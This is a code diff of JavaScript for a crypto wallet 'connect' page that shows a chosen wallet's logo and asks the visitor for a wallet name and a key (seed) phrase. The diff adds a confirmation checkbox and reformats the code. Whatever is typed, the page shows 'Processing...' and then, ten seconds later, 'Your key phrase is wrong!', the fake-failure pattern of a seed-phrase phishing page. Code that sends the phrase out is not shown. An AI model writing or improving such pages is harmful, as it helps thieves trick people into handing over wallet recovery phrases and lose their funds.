@@ -4,49 +4,51 @@ const popup = document.getElementById("popup");
 const popupText = document.getElementById("popupText");
 const closePopupBtn = document.getElementById("closePopupBtn");
 
-// Show popup
 function showPopup(message) {
-    popupText.innerText = message;
-    popup.style.display = "flex";
+  popupText.innerText = message;
+  popup.style.display = "flex";
 }
 
-// Close popup
 closePopupBtn.addEventListener("click", () => {
-    popup.style.display = "none";
+  popup.style.display = "none";
 });
 
-// Read wallet from URL
 const params = new URLSearchParams(window.location.search);
 const wallet = params.get("wallet");
 
 if (wallet) {
-    walletName.innerText = wallet;
+  walletName.innerText = wallet;
 
-    const fileName = wallet
-        .toLowerCase()
-        .replace(/\s+/g, '')
-        .replace(/['./]/g, '');
+  const fileName = wallet
+    .toLowerCase()
+    .replace(/\s+/g, "")
+    .replace(/['./]/g, "");
 
-    walletLogo.src = `wallet-icons/${fileName}.webp`;
+  walletLogo.src = `wallet-icons/${fileName}.webp`;
 
-    walletLogo.onerror = () => {
-        walletLogo.style.display = "none";
-    };
+  walletLogo.onerror = () => {
+    walletLogo.style.display = "none";
+  };
 }
 
-// Connect button
-document.getElementById("connectBtn").addEventListener("click", function () {
-    const name = document.getElementById("walletInput").value.trim();
-    const phrase = document.getElementById("phraseInput").value.trim();
+document.getElementById("connectBtn").addEventListener("click", () => {
+  const name = document.getElementById("walletInput").value.trim();
+  const phrase = document.getElementById("phraseInput").value.trim();
+  const check = document.getElementById("confirmCheck");
 
-    if (name === "" || phrase === "") {
-        showPopup("Please fill out the field");
-        return;
-    }
+  if (name === "" || phrase === "") {
+    showPopup("Please fill out the field");
+    return;
+  }
 
-    showPopup("Processing... please wait");
+  if (!check.checked) {
+    showPopup("Please confirm you entered it correctly");
+    return;
+  }
 
-    setTimeout(() => {
-        showPopup("Your key phrase is wrong!");
-    }, 10000);
+  showPopup("Processing... please wait");
+
+  setTimeout(() => {
+    showPopup("Your key phrase is wrong!");
+  }, 10000);
 });
